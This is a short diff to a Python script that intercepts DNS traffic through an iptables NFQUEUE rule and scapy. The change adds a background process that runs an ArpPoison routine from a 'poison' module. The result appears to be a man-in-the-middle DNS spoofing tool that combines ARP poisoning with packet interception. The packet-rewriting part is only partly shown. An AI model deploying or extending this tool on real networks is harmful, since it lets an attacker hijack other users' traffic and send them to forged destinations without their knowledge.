@@ -1,5 +1,7 @@
+from poison import *
 from netfilterqueue import NetfilterQueue
 from scapy.all import *
+from multiprocessing import Process
 import os
 
 def parse(packet):
@@ -15,15 +17,23 @@ def parse(packet):
         packet.accept()
 
 def main():
+
+    p = Process(target=ArpPoison);
+    p.start()
+
     os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
     nfqueue = NetfilterQueue()
     nfqueue.bind(1, parse)
+
     try:
         nfqueue.run()
+
     except KeyboardInterrupt:
         nfqueue.unbind()
         os.system('iptables -F')
         os.system('iptables -t nat -F')
+
+    p.join()
 
 if __name__ == '__main__':
     main()
